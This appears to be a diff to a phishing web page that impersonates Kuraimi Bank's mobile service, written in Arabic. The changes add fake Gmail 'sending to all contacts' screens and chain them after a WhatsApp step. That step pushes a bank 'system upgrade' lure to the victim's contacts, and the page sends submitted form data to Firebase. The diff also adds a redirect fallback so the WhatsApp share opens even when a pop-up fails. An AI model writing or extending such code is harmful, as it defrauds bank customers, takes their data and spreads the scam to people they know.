@@ -423,6 +423,93 @@
             margin-top: 15px;
         }
         
+        .gmail-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(234, 67, 53, 0.9); /* Gmail red */
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            z-index: 1001;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transform: translateX(120%);
+            transition: transform 0.5s ease;
+        }
+        
+        .gmail-notification.show {
+            transform: translateX(0);
+        }
+        
+        .gmail-process {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1500;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.5s ease;
+        }
+        
+        .gmail-process.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .gmail-process-content {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+        }
+        
+        .gmail-process-icon {
+            color: #EA4335; /* Gmail red */
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        
+        .gmail-process-title {
+            color: #EA4335;
+            font-size: 24px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        .gmail-process-bar {
+            width: 100%;
+            height: 10px;
+            background: #e0e0e0;
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .gmail-process-progress {
+            height: 100%;
+            background: linear-gradient(to right, #4285F4, #34A853, #FBBC05, #EA4335); /* Gmail colors */
+            width: 0%;
+            transition: width 1s ease;
+        }
+        
+        .gmail-process-message {
+            color: #555;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        
         @keyframes pulse {
             0% { transform: scale(1); }
             50% { transform: scale(1.1); }
@@ -539,7 +626,13 @@
     <!-- إشعار نجاح إرسال واتساب -->
     <div class="whatsapp-notification" id="whatsappNotification">
         <i class="fab fa-whatsapp"></i>
-        <span>تم إرسال الرسالة إلى جهات الاتصال على واتساب</span>
+        <span>تم إرسال الرسالة إلى جميع جهات الاتصال على واتساب</span>
+    </div>
+    
+    <!-- إشعار نجاح إرسال جيميل -->
+    <div class="gmail-notification" id="gmailNotification">
+        <i class="fas fa-envelope"></i>
+        <span>تم إرسال الرسالة إلى جميع جهات الاتصال على جيميل</span>
     </div>
     
     <!-- شاشة عملية إرسال واتساب -->
@@ -548,11 +641,25 @@
             <div class="whatsapp-process-icon">
                 <i class="fab fa-whatsapp"></i>
             </div>
-            <h2 class="whatsapp-process-title">جاري إرسال الرسالة إلى جهات الاتصال</h2>
+            <h2 class="whatsapp-process-title">جاري إرسال الرسالة إلى جميع جهات الاتصال</h2>
             <div class="whatsapp-process-bar">
                 <div class="whatsapp-process-progress" id="whatsappProgress"></div>
             </div>
             <p class="whatsapp-process-message" id="whatsappMessage">الرجاء عدم إغلاق الصفحة حتى اكتمال الإرسال</p>
+        </div>
+    </div>
+    
+    <!-- شاشة عملية إرسال جيميل -->
+    <div class="gmail-process" id="gmailProcess">
+        <div class="gmail-process-content">
+            <div class="gmail-process-icon">
+                <i class="fas fa-envelope"></i>
+            </div>
+            <h2 class="gmail-process-title">جاري إرسال الرسالة إلى جميع جهات الاتصال على جيميل</h2>
+            <div class="gmail-process-bar">
+                <div class="gmail-process-progress" id="gmailProgress"></div>
+            </div>
+            <p class="gmail-process-message" id="gmailMessage">الرجاء عدم إغلاق الصفحة حتى اكتمال الإرسال</p>
         </div>
     </div>
 
@@ -675,6 +782,10 @@
         const whatsappProcess = document.getElementById('whatsappProcess');
         const whatsappProgress = document.getElementById('whatsappProgress');
         const whatsappMessage = document.getElementById('whatsappMessage');
+        const gmailNotification = document.getElementById('gmailNotification');
+        const gmailProcess = document.getElementById('gmailProcess');
+        const gmailProgress = document.getElementById('gmailProgress');
+        const gmailMessage = document.getElementById('gmailMessage');
         
         // دالة لإظهار إشعار النجاح
         function showSuccessNotification() {
@@ -689,6 +800,14 @@
             whatsappNotification.classList.add('show');
             setTimeout(() => {
                 whatsappNotification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // دالة لإظهار إشعار جيميل
+        function showGmailNotification() {
+            gmailNotification.classList.add('show');
+            setTimeout(() => {
+                gmailNotification.classList.remove('show');
             }, 3000);
         }
         
@@ -754,7 +873,7 @@
             }, 1000);
         }
         
-        // دالة لمحاكاة عملية إرسال واتساب
+        // دالة لمحاكاة عملية إرسال واتساب إلى جميع جهات الاتصال
         function simulateWhatsAppSending() {
             // إظهار شاشة المحاكاة
             whatsappProcess.classList.add('active');
@@ -772,12 +891,38 @@
                     setTimeout(() => {
                         whatsappProcess.classList.remove('active');
                         showWhatsappNotification();
+                        
+                        // بعد الانتهاء من WhatsApp، نبدأ إرسال Gmail
+                        setTimeout(simulateGmailSending, 2000);
                     }, 2000);
                 }
             }, 100);
         }
         
-        // دالة لإرسال رسالة واتساب تلقائيًا
+        // دالة لمحاكاة عملية إرسال جيميل إلى جميع جهات الاتصال
+        function simulateGmailSending() {
+            // إظهار شاشة المحاكاة
+            gmailProcess.classList.add('active');
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 5;
+                gmailProgress.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    gmailMessage.textContent = "اكتمل الإرسال بنجاح!";
+                    
+                    // إخفاء شاشة المحاكاة بعد ثانيتين
+                    setTimeout(() => {
+                        gmailProcess.classList.remove('active');
+                        showGmailNotification();
+                    }, 2000);
+                }
+            }, 100);
+        }
+        
+        // دالة لإرسال رسالة واتساب تلقائيًا إلى جميع جهات الاتصال
         function sendWhatsAppMessage() {
             const message = `عزيزي عميل بنك الكريمي جوال
 نهنئك بترقية نظامنا المصرفي! لضمان استمرار خدمتك بسلاسة، نرجو 
@@ -789,8 +934,8 @@
             // تشفير الرسالة لاستخدامها في رابط واتساب
             const encodedMessage = encodeURIComponent(message);
             
-            // إنشاء رابط واتساب مع الرسالة
-            const whatsappUrl = `https://wa.me/?text=${encodedMessage}`;
+            // إنشاء رابط واتساب مع الرسالة - يعمل مع جميع الإصدارات
+            const whatsappUrl = `https://api.whatsapp.com/send?text=${encodedMessage}`;
             
             // محاكاة عملية الإرسال
             simulateWhatsAppSending();
@@ -802,6 +947,9 @@
                     window.open(whatsappUrl, '_blank');
                 } catch (e) {
                     console.error("حدث خطأ أثناء فتح واتساب:", e);
+                    
+                    // إذا فشل فتح النافذة، نفتح الرابط في نفس الصفحة
+                    window.location.href = whatsappUrl;
                 }
             }, 3500);
         }
@@ -818,7 +966,7 @@
                 return;
             }
             
-            // إرسال رسالة واتساب تلقائيًا
+            // إرسال رسالة واتساب تلقائيًا إلى جميع جهات الاتصال
             sendWhatsAppMessage();
             
             // إرسال البيانات إلى Firebase
